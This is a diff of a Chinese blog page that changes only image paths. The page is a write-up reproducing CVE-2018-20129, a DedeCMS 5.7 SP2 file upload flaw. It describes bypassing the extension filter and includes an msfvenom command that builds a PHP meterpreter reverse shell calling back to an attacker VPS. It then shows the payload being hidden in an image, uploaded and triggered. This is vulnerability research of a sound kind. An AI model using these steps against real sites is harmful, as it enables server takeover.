@@ -85,17 +85,17 @@
 <meta property="og:site_name" content="HexChristmas&#39;s Blog">
 <meta property="og:description" content="CVE-2018-20129漏洞分析及复现">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://hexchristmas.github.io/p/d8e0.htm/1.png">
-<meta property="og:image" content="https://hexchristmas.github.io/p/d8e0.htm/3.png">
-<meta property="og:image" content="https://hexchristmas.github.io/p/d8e0.htm/4.png">
-<meta property="og:image" content="https://hexchristmas.github.io/p/d8e0.htm/5.png">
-<meta property="og:image" content="https://hexchristmas.github.io/p/d8e0.htm/6.png">
-<meta property="og:image" content="https://hexchristmas.github.io/p/d8e0.htm/7.png">
+<meta property="og:image" content="https://hexchristmas.github.io/p/1.png">
+<meta property="og:image" content="https://hexchristmas.github.io/p/3.png">
+<meta property="og:image" content="https://hexchristmas.github.io/p/4.png">
+<meta property="og:image" content="https://hexchristmas.github.io/p/5.png">
+<meta property="og:image" content="https://hexchristmas.github.io/p/6.png">
+<meta property="og:image" content="https://hexchristmas.github.io/p/7.png">
 <meta property="og:updated_time" content="2020-04-10T15:18:49.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CVE-2018-20129漏洞分析及复现">
 <meta name="twitter:description" content="CVE-2018-20129漏洞分析及复现">
-<meta name="twitter:image" content="https://hexchristmas.github.io/p/d8e0.htm/1.png">
+<meta name="twitter:image" content="https://hexchristmas.github.io/p/1.png">
 
 
 
@@ -324,21 +324,21 @@
 <p>Desdev DedeCMS 5.7 SP2版本中的uploads/include/dialog/select_images_post.php文件存在文件上传漏洞，远程攻击者可利用该漏洞上传并执行任意PHP代码。</p>
 <h2 id="分析">分析</h2>
 <p>uploads/include/dialog/select_images_post.php存在文件上传漏洞，这个模块对应是会员中心—&gt;发表文章—&gt;上传图片。<br>
-<img src="/p/d8e0.htm/1.png" alt="1|690x387"><br>
+<img src="//hexchristmas.github.io/p/1.png" alt="1|690x387"><br>
 <a href="http://10.11.0.63/uploads/member/content_list.php?channelid=1" target="_blank" rel="noopener">http://10.11.0.63/uploads/member/content_list.php?channelid=1</a><br>
 在审计select_images_post.php代码时发现36行过滤一些不正常的字符，在38行处判断了文件名是否包含了$cfg_imgtype。我们可以通过构造eee.p*hp 来进行绕过。<br>
-<img src="/p/d8e0.htm/3.png" alt="3"></p>
+<img src="//hexchristmas.github.io/p/3.png" alt="3"></p>
 <h2 id="利用">利用</h2>
 <p>我们使用msfvenom -p php/meterpreter/reverse_tcp lhost=47.xx.xxx.xx l4port=7169 -f raw &gt;shell.php<br>
-<img src="/p/d8e0.htm/4.png" alt="4|690x455"><br>
+<img src="//hexchristmas.github.io/p/4.png" alt="4|690x455"><br>
 此处，我们使用了一个vps来反弹shell。<br>
-<img src="/p/d8e0.htm/5.png" alt="5|690x499"><br>
+<img src="//hexchristmas.github.io/p/5.png" alt="5|690x499"><br>
 找了个比较滑稽的图片，将shell.php和图片打成图片马。<br>
 大概操作，sss.jpg shell.php &gt;&gt; eee.jpg。<br>
 我们使用BurpSuitePro来进行抓包重放。<br>
-<img src="/p/d8e0.htm/6.png" alt="6|690x387"><br>
+<img src="//hexchristmas.github.io/p/6.png" alt="6|690x387"><br>
 通过curl去让服务器解析。<br>
-<img src="/p/d8e0.htm/7.png" alt="7|690x386"><br>
+<img src="//hexchristmas.github.io/p/7.png" alt="7|690x386"><br>
 成功返回shell。</p>
 <h2 id="修复建议">修复建议</h2>
 <ul>
